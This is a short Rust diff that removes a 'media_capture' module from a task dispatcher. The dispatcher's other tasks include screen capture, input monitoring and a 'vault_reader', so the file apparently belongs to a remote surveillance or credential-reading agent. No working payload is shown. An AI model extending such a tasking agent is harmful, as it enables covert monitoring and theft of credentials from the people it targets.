@@ -8,8 +8,6 @@ pub mod storage;
 pub mod task_viewer;
 #[cfg(feature = "display")]
 pub mod display;
-#[cfg(feature = "media")]
-pub mod media;
 #[cfg(feature = "input_monitor")]
 pub mod input_monitor;
 #[cfg(feature = "vault_reader")]
@@ -97,9 +95,6 @@ pub fn dispatch_task(task_id: i64, task_type: &str, args: &serde_json::Value) ->
 
         #[cfg(feature = "display")]
         "display_capture" => display::capture(task_id, args),
-
-        #[cfg(feature = "media")]
-        "media_capture" => media::capture(task_id, args),
 
         #[cfg(feature = "input_monitor")]
         "input_monitor_start" => input_monitor::start(task_id, args),
